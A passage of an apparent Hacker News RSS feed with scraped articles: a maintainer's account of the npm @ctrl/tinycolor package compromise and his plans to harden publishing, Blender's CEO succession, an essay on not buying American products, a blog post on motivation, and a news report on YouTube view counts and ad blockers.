<p>Malicious versions of several packages — including @ctrl/tinycolor — were briefly available on npm before removal. Installing those compromised versions would have triggered a postinstall payload, which is documented in detail by <a href="https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised#attack-mechanism" rel="noreferrer noopener" target="_blank">StepSecurity</a>.</p>
<p>What should you do if you’ve installed a compromised version of a package? <a href="https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised#immediate-actions-required" rel="noreferrer noopener" target="_blank">see StepSecurity’s immediate actions</a>.</p>
<h2 id="publishing-setup--interim-plan"><a href="#publishing-setup--interim-plan">Publishing Setup &amp; Interim Plan</a></h2>
<p>I currently use <a href="https://github.com/semantic-release/semantic-release" rel="noreferrer noopener" target="_blank">semantic-release</a> with GitHub Actions to handle publishing. The automation is convenient and predictable. I also have npm provenance enabled on many packages, which provides attestations of how they were built. Unfortunately, provenance didn’t prevent this attack because the attacker had a valid token.</p>
<p>My goal is to move to npm’s <strong>Trusted Publishing (OIDC)</strong> to eliminate static tokens altogether. However, semantic-release integration is still in progress: <a href="https://github.com/npm/cli/issues/8525" rel="noreferrer noopener" target="_blank">npm/cli#8525</a>.</p>
<p><img alt="npm Publishing access settings" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 1618px) 1618px, 100vw" data-astro-image="constrained" width="1618" height="804" src="https://sigh.dev/_astro/publishing-access.DTmYbTkJ_Z2may3Q.webp" srcset="https://sigh.dev/_astro/publishing-access.DTmYbTkJ_1Fa49o.webp 640w, https://sigh.dev/_astro/publishing-access.DTmYbTkJ_Z22BseH.webp 750w, https://sigh.dev/_astro/publishing-access.DTmYbTkJ_Z27AVbY.webp 828w, https://sigh.dev/_astro/publishing-access.DTmYbTkJ_ZGtYiM.webp 1080w, https://sigh.dev/_astro/publishing-access.DTmYbTkJ_Z11X4ph.webp 1280w, https://sigh.dev/_astro/publishing-access.DTmYbTkJ_Z2may3Q.webp 1618w"></p><p>For the forseeable future, @ctrl/tinycolor requires 2FA for publishing, and all tokens have been revoked. Not expecting to merge any new changes anytime soon.</p>
<p>For smaller packages, I’ll continue using semantic-release but under stricter controls: no new contributors will be added, and each repo will use a granular npm token limited to publish-only rights for that specific package.</p>
<p>Local 2FA based publishing isn’t sustainable, so I’m watching OIDC/Trusted Publishing closely and will adopt it as soon as it fits the workflow.</p>
<p>I plan to continue using pnpm that prevents unapproved postinstall scripts from being run and I’ll look into adding pnpm’s new <a href="https://pnpm.io/settings#minimumreleaseage" rel="noreferrer noopener" target="_blank">minimumReleaseAge</a> setting.</p>
<h2 id="publishing-wishlist"><a href="#publishing-wishlist">Publishing Wishlist</a></h2>
<p>If I could wave a magic wand and design my ideal setup, npm would allow me to require Trusted Publishing (OIDC) with a single toggle for all of my packages. That same toggle would block any release missing provenance, enforcing security at the account level. I’d also want first-class semantic-release support with OIDC and provenance so no static tokens are ever needed.</p>
<p>On top of that, I’d like a secure, human-approved publishing option directly in the GitHub UI: a protected workflow_dispatch flow that uses github 2FA approval to satisfy 2FA, without requiring me to publish from my laptop.</p>
<p>GitHub Environments — or equivalent workflow protections — should be available without a Pro subscription, or else integrated directly into Trusted Publishing so that security doesn’t depend on the pricing tier.</p>
<p>It would be really nice if NPM also had a more visible mark on the package details page to indicate if the package had a postinstall script. Also, once the packages are pulled its not clear what versions were removed and why.</p>
<h2 id="thanks"><a href="#thanks">Thanks</a></h2>
<p>Thanks to Wes Todd, the OpenJS Foundation, and the GitHub/npm security teams for their rapid and coordinated response. Everyone was incredibly fast, helpful, and knowledgeable.</p>
<p><img alt="dune worm [wide] | dune worm via chatgpt" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 1536px) 1536px, 100vw" data-astro-image="constrained" width="1536" height="1024" src="https://sigh.dev/_astro/dune-worm.QN2JLFkT_ZOy594.webp" srcset="https://sigh.dev/_astro/dune-worm.QN2JLFkT_ZWljFi.webp 640w, https://sigh.dev/_astro/dune-worm.QN2JLFkT_Z24bQ0U.webp 750w, https://sigh.dev/_astro/dune-worm.QN2JLFkT_1CdkyI.webp 828w, https://sigh.dev/_astro/dune-worm.QN2JLFkT_1kRnJS.webp 1080w, https://sigh.dev/_astro/dune-worm.QN2JLFkT_Z1xwr04.webp 1280w, https://sigh.dev/_astro/dune-worm.QN2JLFkT_ZOy594.webp 1536w">  </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Drought in Iraq reveals tombs created 2,300 years ago (136 pts)]]></title>
            <link>https://www.smithsonianmag.com/smart-news/severe-droughts-in-iraq-reveals-dozens-of-ancient-tombs-created-2300-years-ago-180987347/</link>
            <guid>45278581</guid>
            <pubDate>Wed, 17 Sep 2025 17:12:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.smithsonianmag.com/smart-news/severe-droughts-in-iraq-reveals-dozens-of-ancient-tombs-created-2300-years-ago-180987347/">https://www.smithsonianmag.com/smart-news/severe-droughts-in-iraq-reveals-dozens-of-ancient-tombs-created-2300-years-ago-180987347/</a>, See on <a href="https://news.ycombinator.com/item?id=45278581">Hacker News</a></p>
Couldn't get https://www.smithsonianmag.com/smart-news/severe-droughts-in-iraq-reveals-dozens-of-ancient-tombs-created-2300-years-ago-180987347/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Ton Roosendaal to step down as Blender chairman and CEO (309 pts)]]></title>
            <link>https://www.cgchannel.com/2025/09/ton-roosendaal-to-step-down-as-blender-chairman-and-ceo/</link>
            <guid>45278279</guid>
            <pubDate>Wed, 17 Sep 2025 16:49:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cgchannel.com/2025/09/ton-roosendaal-to-step-down-as-blender-chairman-and-ceo/">https://www.cgchannel.com/2025/09/ton-roosendaal-to-step-down-as-blender-chairman-and-ceo/</a>, See on <a href="https://news.ycombinator.com/item?id=45278279">Hacker News</a></p>
<div id="readability-page-1" class="page"><div class="page">
			<article class="page">
			<header>
				<span>Wednesday, September 17th, 2025</span>
				Posted by Jim Thacker			</header>

			

			<main>
				
				
<p><iframe width="960" height="539" src="https://www.youtube.com/embed/JXm0-ilIknE?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen="" title="Keynote — Blender Conference 2025"></iframe></p>
<p><br>
Ton Roosendaal is to stop down as chairman and Blender CEO on 1 January 2026. The news was announced during today’s keynote at the annual Blender Conference.</p>
<p>Roosendaal – the <a href="https://www.blender.org/about/history/" target="_blank">original author</a> of the open-source 3D software, and its public figurehead for the past three decades – will pass on his roles to current Blender COO Francesco Siddi.</p>
<p>Roosendaal himself will move to the newly established Blender Foundation supervisory board.</p>
<p>Other new Blender Foundation board positions will also include Sergey Sharybin (Head of Development), Dalai Felinto (Head of Product) and Fiona Cohen (Head of Operations).</p>
<p>“We’ve been preparing for this since 2019,” said Roosendaal, “I am very proud to have such a wonderfully talented young team around me to bring our free and open source project into the next decade.”</p>
<p><em>We aim to update this story with a brief retrospective of Ton’s time as Blender CEO and the growth of Blender during that time, so check back for updates.</em></p>
<p><a href="https://www.blender.org/press/blender-foundation-announces-new-board-and-executive-director/" target="_blank">Read the official announcement that Ton Roosendaal is stepping down as Blender CEO</a></p>


			</main>

			
			<!-- Tags -->

			
		</article>

		
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Not Buying American Anymore (147 pts)]]></title>
            <link>https://xd1.dev/2025/09/not-buying-american-anymore</link>
            <guid>45277346</guid>
            <pubDate>Wed, 17 Sep 2025 15:53:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://xd1.dev/2025/09/not-buying-american-anymore">https://xd1.dev/2025/09/not-buying-american-anymore</a>, See on <a href="https://news.ycombinator.com/item?id=45277346">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
                <h2 id="content-not-buying-american-anymore">Not buying American anymore</h2>
<p>I feel like I need to first defuse any idea of antagonizing Americans
themselves. The people are never to blame. This isn't a post criticizing the
American people, it's criticizing the state of things that makes it impractical
to have any sort of economical relation with the country if you are an average
Joe like me.</p>
<h2 id="content-where-do-i-come-from">Where do I come from</h2>
<p>I come from a place where I believe regulation needs to be employed to protect
the weaker party in any economic relation. If you don't agree with this
probably this rant isn't for you.</p>
<p>I also come from Brazil, a country that, for better or worse, is arguably a
strongly regulated market. For worse I guess because it makes all transactions
that bit more bureaucratic, for better because I am sure to be able to buy
something and have it too, without fear that corporations will swoop in and
take away my rights after purchase.</p>
<p>The <a href="https://www.gov.br/mj/pt-br/assuntos/seus-direitos/consumidor/Anexos/guia-do-consumidor-estrangeiro-ingles.pdf">Consumer Defense
Code</a>
is strong and mostly works, at least insofar as I needed to use it, and many
issues can be resolved directly with companies via
<a href="https://www.reclameaqui.com.br/">reclameaqui</a>, which is a website that
streamlines the communication with sellers to resolve problems without having
to go to court.</p>
<p>So here are my biases laid out in advance.</p>
<h2 id="content-why-am-i-writing-this">Why am I writing this</h2>
<p>I've been following <a href="https://www.youtube.com/@rossmanngroup">Louis Rossmann's youtube
channel</a> for a while now, mostly
because their tech repair videos are really interesting. And I really love
cats. But lately I've seen
<a href="https://youtu.be/HlyiLQ6WPRU?si=LeS8D1ntWfTUrUUB">many</a>
<a href="https://youtu.be/KNuZ3BjT7IU?si=93NVeqWEI1CO24Nv">worrying</a>
<a href="https://youtu.be/lzdIjCzKhfM?si=dET-MmiWzW7VJixk">videos</a> in the channel about
anti-consumer practices and I felt like I needed to vent.</p>
<p>You can ask why do I even care about these videos if I don't live in the US.
Well, in a globalized world where we are steadily blurrying the lines that
separate countries and nations (also for better and worse), there is really no
such distinction. Sure when I buy services and pay for them in my local
currency, I'm likely protected by local laws, and also in the case of Netflix
I'm also restricted by geographical limitations, but that's not always the
case, specially when purchasing software.</p>
<p>I've just came across <a href="https://youtu.be/YAx3yCNomkg?si=PhsAcUN-z7zXpvOC">this
video</a> where Louis explains
what Reason studios did to screw over their customers by removing the option to
activate older products that still work fine. I am also a musician in my spare
time, mostly hobbyist, but I did purchase music production software before and
I could just as easily have been a victim of such customer-hostile practices. I
don't need to be American to be an interested party when laws, or lack thereof,
of foreign country directly affects me.</p>
<h2 id="content-current-state-of-things">Current state of things</h2>
<p>All this points to a very clear trend, at least for me, that the US is <a href="https://www.hks.harvard.edu/faculty-research/policycast/oligarchy-open-what-happens-now-us-forced-confront-its-plutocracy">openly
an
oligarchy</a>.
And this explains very well this trend of consumer-hostile practices.</p>
<p>If a country and its laws serve the nobility and the extremely wealthy, it'll
work in favor of those, of maintaining their status and wealth. An oligarchy
isn't a regime that is characterized by actively screwing over the common
people. It doesn't need to be. All it needs is to give a free pass for those
that maintain power and influence to do whatever they want in order to maximize
their profits and expand their influence.</p>
<p>This is why all these anti-consumer practices are happening out in the open.
Really... what are the chances that in the current administration a profitable
company will be prosecuted by anti-consumer practices?</p>
<p>Given time, a liberal capitalist democracy with excessively weak regulations
will eventually devolve into a plutocracy just because companies need to make
money to appease investors at all costs. When they are out of ideas for
innovation, or when innovation is just too risky, they will <a href="https://www.baldurbjarnason.com/2024/the-deterioration-of-google/">make their
services
worse</a>,
<a href="https://shawlewenz.com/11-times-big-brands-violated-consumer-protection-laws/">violate consumer protection laws if it makes them more
competitive</a>
and <a href="https://disconnect.blog/ive-had-it-with-microsoft/">make the consumer pay more for
it</a>, just because it looks
good in a quarterly report -- which I guess <a href="https://www.reuters.com/sustainability/boards-policy-regulation/trump-renews-calls-ending-quarterly-reports-companies-2025-09-16/">won't be quarterly
anymore</a>
because it's not looking too good lately.</p>
<h2 id="content-a-counter-argument">A counter argument</h2>
<p>There is a point to be made that all these changes were made recently and that
there was no reason not to buy American ten, fifteen years ago. And therefore
this logic of not buying American isn't going to work because the same can
happen anywhere else.</p>
<p>But I'd disagree. We can't and we don't need to be able to see the future to
make informed decisions. Ten years ago there was no reason not to buy American.
There is now and that's the end of it. If I start buying European and they
start behaving like the US does now, then this rant will just as easily apply
to them.</p>
<p>A good, informed decision doesn't require knowledge of the future. It just need
to be grounded in solid contemporary facts, and the fact is there is no reason
we can trust American companies anymore.</p>
<p>This rant also isn't to say that <em>all</em> American companies are trying to make
the largest possible profit at the expense of their customers. There surely are
legit businesses trying to be profitable at the same time as they care and
protect their customers. Unfortunately these same theoretical companies are
subjective to the current US economical ethos that exposes them to hostile
takeovers and pressure from investors. This is why in an unregulated market
that makes it <em>that</em> easy to screw customers over, even those that are honest
good-working citizens can't really be trusted to run stable and responsible
companies in the long run.</p>
<h2 id="content-a-moral-imperative">A moral imperative</h2>
<p>The TLDR is: if you can, don't buy American. I'm not buying it anymore if I
can. There is little innovation to be had there, little protection to rely upon
and to be honest little incentive to keep buying it, because the rest of the
world is picking up relatively quickly, since all the wealth has had a negative
impact in the incentive for the US industry to keep itself up to date.</p>
<p>Choosing not to buy American is a message. The message is simple. I don't need
it. I would like to keep improving on things, keep working together and be part
of flourishing global community. But I don't have to. I can make do with less
feature-packed alternatives that will serve me longer term. I can do without
all the wealth and shiny things, because honestly in a couple of decades time
nobody will even remember it if the US keeps not paying attention to those that
generate actual value to the world, the people. If you change your laws, if you
can show that you are not out there to get my money at all costs, then we are
back in business. Until them I'm not buying American anymore.</p>
<p>Nothing is too big that it can't be replaced.</p>
<h2 id="content-comments">Comments</h2>
<p>If you want to comment on this blog post, I invite you to follow the dicussions
on <a href="https://news.ycombinator.com/item?id=45277346">Hackernews</a>.</p>

                
                
            </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How to motivate yourself to do a thing you don't want to do (285 pts)]]></title>
            <link>https://ashleyjanssen.com/how-to-motivate-yourself-to-do-a-thing-you-dont-want-to-do/</link>
            <guid>45276987</guid>
            <pubDate>Wed, 17 Sep 2025 15:25:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ashleyjanssen.com/how-to-motivate-yourself-to-do-a-thing-you-dont-want-to-do/">https://ashleyjanssen.com/how-to-motivate-yourself-to-do-a-thing-you-dont-want-to-do/</a>, See on <a href="https://news.ycombinator.com/item?id=45276987">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <article>

            <header>

                

                    

                    <p>Learn some ways to help encourage action when you feel unmotivated.&nbsp;</p>

                    <figure>
        <img srcset="https://ashleyjanssen.com/content/images/size/w300/2025/09/How-to-Motivate-Yourself-To-Do-A-Thing-You-Don-t-Want-to-Do.jpg 300w,
                    https://ashleyjanssen.com/content/images/size/w720/2025/09/How-to-Motivate-Yourself-To-Do-A-Thing-You-Don-t-Want-to-Do.jpg 720w,
                    https://ashleyjanssen.com/content/images/size/w960/2025/09/How-to-Motivate-Yourself-To-Do-A-Thing-You-Don-t-Want-to-Do.jpg 960w,
                    https://ashleyjanssen.com/content/images/size/w1200/2025/09/How-to-Motivate-Yourself-To-Do-A-Thing-You-Don-t-Want-to-Do.jpg 1200w,
                    https://ashleyjanssen.com/content/images/size/w2000/2025/09/How-to-Motivate-Yourself-To-Do-A-Thing-You-Don-t-Want-to-Do.jpg 2000w" sizes="(max-width: 1200px) 100vw, 1200px" src="https://ashleyjanssen.com/content/images/size/w1200/2025/09/How-to-Motivate-Yourself-To-Do-A-Thing-You-Don-t-Want-to-Do.jpg" alt="How to Motivate Yourself To Do A Thing You Don't Want to Do">
            <figcaption><span>Photo by </span><a href="https://unsplash.com/@anniespratt?utm_content=creditCopyText&amp;utm_medium=referral&amp;utm_source=unsplash"><span>Annie Spratt</span></a><span> on </span><a href="https://unsplash.com/photos/a-piece-of-paper-with-a-message-written-on-it-0Qo_Nn5wLOc?utm_content=creditCopyText&amp;utm_medium=referral&amp;utm_source=unsplash"><span>Unsplash</span></a></figcaption>
    </figure>
            </header>

            <section>
                <p>We have an air bike in our basement. If you are unfamiliar with air bikes, they are similar to stationary bikes with foot pedals but also have handles you push and pull with your arms. It uses air resistance, so the harder you pedal and move your arms, the higher the resistance.&nbsp;</p><p>It’s also known as an assault bike. 😬</p><p>Which is apt, because it’s a <em>butt-kicker</em> of a workout. I use it about once a week, more frequently in the winter when it’s too cold to run, and less often in the summer when I can get outside more. And I kind of hate it!</p><p>Before I even drag myself to our basement, I’m already dreading it. The only way I can convince myself to do it is by finding a suitably engaging show I can distract myself with on my phone while I huff and puff.&nbsp;</p><p>Every time, I start my warm-up and think to myself,</p><p>“It’s only 30 minutes, I can do this!”</p><p>Like clockwork, within the first three minutes, I think, “Maybe I will only do ten minutes today and do some pilates or weights instead.”</p><p>After ten minutes, I think, “OK, surely I can make it to 20 minutes, and that will be enough”.</p><p>After 20 minutes, as I gasp for air and sweat soaks through my shirt, I think “Well, I already made it to 20 minutes… I guess I will just finish it.”</p><p>And then I proceed to huff and puff to the end, wherein I walk my wobbly legs back up the stairs to do a cooldown. At which point I think, “That suuuuuucked…” And then congratulate myself on finishing as I try to get my heart rate back to normal. 🥵</p><p>This mental dance happens, without fail, every single time I ride.&nbsp;</p><hr><p>I share this anecdote because it illustrates how tricky motivation can be, especially when faced with something you don’t want to do or have been procrastinating on. There are any number of things you have to deal with in your life that you don’t want to. There are even things you might generally enjoy that feel like they are hanging over you.&nbsp;</p><p>The pattern often goes like this:</p><ul><li>Before you start, it feels daunting, and the prospect lingers in the back of your mind. You know it needs to be done, but you really, <em>really</em> don’t feel like it. You leave it until it starts to loom larger and larger.</li><li>When you finally convince yourself to start, it’s not what you want to be doing, but it’s generally <em>fine</em>. It’s often not even as bad as you thought it would be, and it feels good to make progress.</li><li>As you near the end, you can even push yourself a little to wrap it up and get it off your plate.</li><li>When it’s over, you feel relieved, like a weight has been taken off your shoulders, and you are both pleased with yourself and a little annoyed that it took you so long to deal with.</li></ul><p>Sound familiar?&nbsp;</p><p>Motivation is a topic that comes up with nearly all my clients, as they navigate the various complexities of their lives. In some ways, motivation seems simple. You ask yourself, <strong>“Why can’t I just <em>make</em> myself be motivated to do the thing?”</strong>, whatever the thing might be. However, as you beat yourself up about it, consider that many factors influence our decision-making and the feeling of being motivated.</p><p>Humans are complex creatures, with <a href="https://thetouchpointsolution.com/blogs/touchpoints-blog/the-impact-of-brain-chemicals-on-mood-and-health?ref=ashleyjanssen.com"><u>numerous brain chemicals and hormones</u></a> influencing our overall physical and emotional state, which themselves are constantly impacted, sometimes drastically, by things like:</p><ul><li>Have you been sleeping well and enough?</li><li>Have you been eating well and the right amount for you?</li><li>Have you been imbibing in alcohol or other things?</li><li>Have you been moving your body regularly?</li><li>Do you have any physical or mental conditions?</li><li>Are you in pain?</li><li>Do you have significant life stressors at this time?</li><li>What time of day is it?</li><li>Where are you in your natural hormone cycles?</li><li>How old are you?</li><li>Have you had any conflicts in your life recently?</li><li>Did you move your body in a way entirely within your usual routines, but apparently in a way that is no longer acceptable?&nbsp;</li><li>Did you sleep in a slightly different position than usual, and now your back will never be the same again?</li></ul><p>I could go on, but you get the idea.😅</p><p>All of these factors (and more) conspire to shift your mood, physical energy, and mental energy, often making it harder to muster the motivation to do things. What, then, can you do to move things in the right direction? How do you motivate yourself to do a thing you don’t want to do?</p><p>Here are several ways to help encourage action when you feel unmotivated.&nbsp;</p><h2 id="1-think-about-why-you-are-feeling-unmotivated">1. Think about <em>why</em> you are feeling unmotivated</h2><p>There are many external and internal factors, as listed above, that contribute to motivation.&nbsp;</p><ul><li>When your body isn’t feeling good, it’s harder to make it do things.&nbsp;</li><li>When your mind is tired, distracted, or overwhelmed, it’s challenging to focus and accomplish tasks.&nbsp;</li><li>When the thing you need to do isn’t important to you or something you don’t like, it’s hard to make yourself do it.</li></ul><p>When you know why you aren’t motivated, you can think about what you could change to make things easier on yourself. What factors do you have control over?&nbsp;</p><ul><li><strong>Environment</strong> - Is there a place you can go or a thing you can add that will make it feel easier? For example, I have my writing desk set up in a quiet corner of my bedroom (not the office I share with my husband) to help make writing easier, even when I am not feeling it.&nbsp;</li><li><strong>Mood</strong> - Is there something that will help boost your mood? Go for a ten-minute walk, treat yourself to a donut, text your best friend for a pep talk, turn on your favourite tunes… anything that will give you a little pick-me-up.</li><li><strong>Body</strong> - Are there things you can do to take care of your body to make it feel better? Try some stretching, take a nap, meditate, read a book, get some fresh air, go for a run, eat a comfort meal, or do anything that will help your body feel less stressed.</li><li><strong>Negative or fear motivators</strong> - Is the thing you are not motivated to do being motivated by negative or <a href="https://ashleyjanssen.com/7-strategies-to-stop-fear-based-decision-making/"><u>fear motivators</u></a>? These include things like fear of judgment, fear of conflict, shame, guilt, or obligation. These motivators only go so far and deserve further examination to determine their place in your priorities. Maybe they aren’t things you need to do in the first place.&nbsp;&nbsp;</li></ul><p>The key point here is to identify where you have control and where you don’t, and then do your best to adapt your circumstances to make it easier to take action.</p><h2 id="2-identify-what-does-motivate-you">2. Identify what <em>does</em> motivate you&nbsp;</h2><p>When you think about the various activities and tasks you do each day, what is it that encourages you to do them? Some of those things will be negative motivators, as I mentioned above, but others will be things you do for fun, because they are interesting or rewarding. These are some tactics to consider for things that might help motivate you:</p><h3 id="combine-the-task-with-something-you-enjoy">Combine the task with something you enjoy</h3><p>You know what makes cleaning out the garage a lot better? Some good tunes. Throw on an audiobook while you cook dinner. Watch a good show while you huff and puff on the air bike! Think about the things you enjoy and consider how you can combine them with the thing you're trying to motivate yourself to do.</p><h3 id="add-external-accountability">Add external accountability</h3><p>Sometimes it can be challenging to push yourself to do something when there are no external motivators. Ask a friend to be your accountability buddy, or hire a professional to help you stay accountable for the thing you're trying to do, such as a coach, trainer, teacher, or dietitian. I know that one of the significant value-added benefits my clients get from <a href="https://ashleyjanssen.com/consulting/"><u>working with me</u></a> for a few months is having someone they have to report back to on their progress!</p><h3 id="gamify">Gamify</h3><p>Is there any way to turn the process or thing you are unmotivated to do into a game? Can you add rewards if you do a certain amount, or set a goal for how many days you make progress in a row? For example, one of my motivators for doing some kind of fitness every day is<a href="https://ashleyjanssen.com/how-tracking-and-streaks-help-you-establish-habits-and-reach-your-goals/"><u> keeping up my streak</u></a>! 2817 days in a row as of publishing. 😁</p><h3 id="celebrate-milestones">Celebrate milestones</h3><p>Beyond small planned rewards, having something to look forward to as you make progress on your task or activity can also help encourage you to continue moving forward. Maybe you take a day off, order your favourite takeout, or simply share it with someone you care about.&nbsp;</p><p>For more specifics on types of motivation, read my article, <a href="https://ashleyjanssen.com/what-motivates-you-learn-the-types-of-motivation-and-how-to-use-them/"><u>What Motivates You? Learn the Types of Motivation and How to Use Them</u></a><strong>, </strong>where I get into more detail about intrinsic and extrinsic motivation.</p><figure><img src="https://ashleyjanssen.com/content/images/2025/09/treat-yo-self.jpg" alt="" loading="lazy" width="2000" height="1244" srcset="https://ashleyjanssen.com/content/images/size/w600/2025/09/treat-yo-self.jpg 600w, https://ashleyjanssen.com/content/images/size/w1000/2025/09/treat-yo-self.jpg 1000w, https://ashleyjanssen.com/content/images/size/w1600/2025/09/treat-yo-self.jpg 1600w, https://ashleyjanssen.com/content/images/size/w2400/2025/09/treat-yo-self.jpg 2400w" sizes="(min-width: 720px) 720px"><figcaption><span>Photo by </span><a href="https://unsplash.com/@jayrheike?utm_content=creditCopyText&amp;utm_medium=referral&amp;utm_source=unsplash"><span>Jay Heike</span></a><span> on </span><a href="https://unsplash.com/photos/white-love-neon-light-signage-QZ8dPT46gzc?utm_content=creditCopyText&amp;utm_medium=referral&amp;utm_source=unsplash"><span>Unsplash</span></a></figcaption></figure><h2 id="3-break-it-into-smaller-chunks">3. Break it into smaller chunks</h2><p>If part of why you feel unmotivated is that what you need to do feels big and overwhelming, often the best thing you can do is try to break it down into smaller, more manageable pieces. What is the smallest amount you can do to make a bit of progress?</p><ul><li>Commit to spending 5 minutes on it</li><li>Choose a small corner of a room you need to clean</li><li>Commit to writing the outline</li><li>Write the text, even if you don’t send it</li><li>Plan in your calendar when you will do it, so you don’t have it sitting in the back of your mind</li><li>Talk about it with your partner or a friend</li><li>Switch tasks to take a break and come back to it</li></ul><p>Often, getting over the hump of <em>starting</em> something is enough to help push you through it. Even if it isn’t, at the very least, you have made some amount of progress, which you can build on.&nbsp;</p><h2 id="4-consistency-over-motivation">4. Consistency over motivation</h2><p>If the thing you need to do is something you need to do regularly, like writing, fitness, practicing an instrument, or cleaning, you can’t rely purely on motivation to drive you. Even for things you enjoy, it’s easy to push something off <em>“until you feel like it”.</em> But with so many factors affecting your mood and energy, the times when you feel like it will be fleeting. Instead of relying on motivation, try to establish a routine that fosters consistency.&nbsp;</p><ul><li>Plan your <a href="https://ashleyjanssen.com/time-blocking-and-imagining-your-ideal-week/" rel="noreferrer">intentional week</a> so you have an idea of when you intend to do it</li><li>Set a daily reminder</li><li>Book it in your calendar</li><li>Set a certain amount of time you will put aside each day or week to chip away at it</li></ul><p>A little bit, consistently, will go a long way.</p><h2 id="5-put-it-on-the-back-burner">5. Put it on the back burner</h2><p>Sometimes, when you are not feeling motivated to do something, it’s reasonable to just put it on the back burner. Maybe it’s just not a priority right now, and that’s totally fine! Ask yourself, is this <a href="https://ashleyjanssen.com/how-to-juggle-priorities-decide-which-balls-are-glass-and-which-are-plastic/"><u>a glass ball</u></a> or a plastic ball? If it’s plastic, set it aside for a bit and focus your time and energy on other things.</p><p>It's ok to decide now is not the right time, but make it an intentional decision instead of something you avoid and feel bad about!</p><hr><p>If you're struggling with motivation, you're not alone! It’s normal, it’s natural, and there are tons of different, ever-changing factors that will change how you feel. Do your best to examine where you are at, control what you can control, and make progress where you can!</p><p>Need some help getting motivated? Get in touch!</p>
            </section>

            

            <div>
                        <figure>
                            <img src="https://ashleyjanssen.com/content/images/2023/09/AshleyJanssen-500x500.jpeg" alt="Ashley Janssen">
                        </figure>

                    <div>


                        <p>Productivity consultant, writer, speaker, serial entrepreneur, chaos calmer, introvert, cat-lady. Lover of books, fitness, old fashioned’s, basketball, and video games.</p>

                        <p>
                            Follow me on
                            <a href="https://twitter.com/AshleyJanssen">Twitter</a>
                            or
                            <a href="https://www.linkedin.com/in/ashleyjanssen">LinkedIn</a>.
                            <br>
                            Hire me for
                            <a href="https://ashleyjanssen.com/consulting">1 on 1 productivity consulting</a>
                            or
                            <a href="https://ashleyjanssen.com/speaking">speaking</a>.
                        </p>
                    </div>
                </div>
        </article>


                

    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[YouTube addresses lower view counts which seem to be caused by ad blockers (308 pts)]]></title>
            <link>https://9to5google.com/2025/09/16/youtube-lower-view-counts-ad-blockers/</link>
            <guid>45276262</guid>
            <pubDate>Wed, 17 Sep 2025 14:29:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://9to5google.com/2025/09/16/youtube-lower-view-counts-ad-blockers/">https://9to5google.com/2025/09/16/youtube-lower-view-counts-ad-blockers/</a>, See on <a href="https://news.ycombinator.com/item?id=45276262">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
					
<figure>
	<img width="1600" height="800" src="https://9to5google.com/wp-content/uploads/sites/4/2025/06/youtube-logo-desktop-1.jpg?quality=82&amp;strip=all&amp;w=1600" alt="" srcset="https://i0.wp.com/9to5google.com/wp-content/uploads/sites/4/2025/06/youtube-logo-desktop-1.jpg?w=320&amp;quality=82&amp;strip=all&amp;ssl=1 320w, https://i0.wp.com/9to5google.com/wp-content/uploads/sites/4/2025/06/youtube-logo-desktop-1.jpg?w=640&amp;quality=82&amp;strip=all&amp;ssl=1 640w, https://i0.wp.com/9to5google.com/wp-content/uploads/sites/4/2025/06/youtube-logo-desktop-1.jpg?w=1024&amp;quality=82&amp;strip=all&amp;ssl=1 1024w, https://i0.wp.com/9to5google.com/wp-content/uploads/sites/4/2025/06/youtube-logo-desktop-1.jpg?w=1500&amp;quality=82&amp;strip=all&amp;ssl=1 1500w" decoding="async" fetchpriority="high"></figure>

<p>Over the past month or so, many YouTubers have been reporting major drops to their video view counts. Theories have run wild, but there’s one explanation involving ad blockers that makes the most sense, but YouTube isn’t confirming anything directly.</p>



<p>Since mid-August, many YouTubers have noticed their view counts are considerably lower than they were before, in some cases with very drastic drops. The reason for the drop, though, has been shrouded in mystery for many creators.</p>



<p>The most likely explanation seems to be that YouTube is not counting views properly for users with an ad blocker enabled, another step in the platform’s continued war on ad blockers. This was first realized <a href="https://youtu.be/YX1eEe8erkQ">by Josh Strife Hayes, who noticed</a> that view counts on TV, phones, and tablets have been steady, while views on computers have dropped by around 50% since the mid-August trend started. TechLinked, a channel in the Linus Tech Tips family, <a href="https://youtu.be/gZ5pATTvc2o">confirmed similar numbers within its statistics</a>.</p>



<p>This aligns with one of the possible explanations that <a href="https://support.google.com/youtube/thread/373195597">YouTube itself hinted at in an acknowledgement of lower view counts. </a></p>	
	



<p>Google says:</p>



<blockquote>
<p><strong>Viewers Using Ad Blockers &amp; Other Content Blocking Tools:&nbsp;</strong>Ad blockers and other extensions can impact the accuracy of reported view counts. Channels whose audiences include a higher proportion of users utilizing such tools may see more fluctuations in traffic related to updates to these tools.</p>
</blockquote>




	<p>The rest of the post addresses prior speculation that YouTube’s <a href="https://9to5google.com/2025/08/07/youtube-ai-age-verification-what-to-know/">new AI-powered age verification tools</a> were to blame – which YouTube adamantly says is not the case – while also offering other possible explanations such as “seasonal viewing habits” and competition on the platform. </p>



<p>YouTube says “there is no systemic issue that is impacting creators” regarding lower view counts.</p>



<p>This ad blocker situation does seem the most likely explanation, though. In <a href="https://youtu.be/KqCV6Rk8kOA">a prior video</a>, Linus Tech Tips had noted that while view counts were down, ad revenue was not. If computer views are the only ones down, it stands to reason that viewers using an ad blocker are not being counted correctly, especially if ad revenue isn’t taking a hit from the lower view counts. YouTube’s hint that ad blockers “can impact the accuracy of reported view counts” certainly suggests this is possible, even if it’s not firm confirmation.</p>



<h2 id="h-more-on-youtube">More on YouTube:</h2>



<ul>
